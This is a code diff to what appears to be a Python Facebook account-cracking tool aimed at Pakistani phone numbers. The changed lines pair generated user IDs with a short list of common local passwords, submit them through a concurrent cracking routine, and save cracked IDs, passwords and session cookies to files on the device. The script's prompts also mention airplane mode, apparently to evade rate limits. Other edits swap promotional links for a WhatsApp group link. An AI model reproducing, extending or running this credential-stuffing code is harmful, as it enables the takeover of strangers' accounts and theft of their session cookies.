@@ -156,7 +156,7 @@ agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/60
   
 os.system("clear")
 print(" SUBSCRIBE MY YIUTBE CHANNEL ")
-os.system("xdg-open https://youtube.com/@JUNED_YT_?si=8lJ9ghy7OtPlMXet")
+os.system("xdg-open https://chat.whatsapp.com/LNNSI7KbvGr6C4LOm6A4Yw")
 #app  check 
 
 
@@ -199,7 +199,7 @@ def menu():
 	if opt =='1':
 		random_crack()
 	if opt =='2':
-		os.system("xdg-open https://www.facebook.com/profile.php?id=100033685782498")
+		os.system("xdg-open https://chat.whatsapp.com/LNNSI7KbvGr6C4LOm6A4Yw")
 		menu()
     #if opt =='0':
     	#exit()
@@ -401,7 +401,7 @@ def random_pak_number():
 		print('\033[1;33;1m[?] YOUR CONTORY (\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'khankhan','khankhan123','malikmalik','baloch','pakistan','khan12345','alikhan12345','aliali','janjan','ali1122','khann1122','khan12','khan123','khan786']
+			pwx = [guru,'khankhan','baloch','khan123','khan786']
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
@@ -463,7 +463,7 @@ def rcrack(uid,pwx,tl):
 
 				print(f" Cookie : {coki}")
 
-				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+				open('/sdcard/ANOX-OK.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
 
 				oks.append(uid)
 
@@ -477,7 +477,7 @@ def rcrack(uid,pwx,tl):
 
 				
 
-				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				open('/sdcard/ANOX-CP.txt', 'a').write(uid+'|'+ps+'\n')
 
 				cps.append(uid)
 
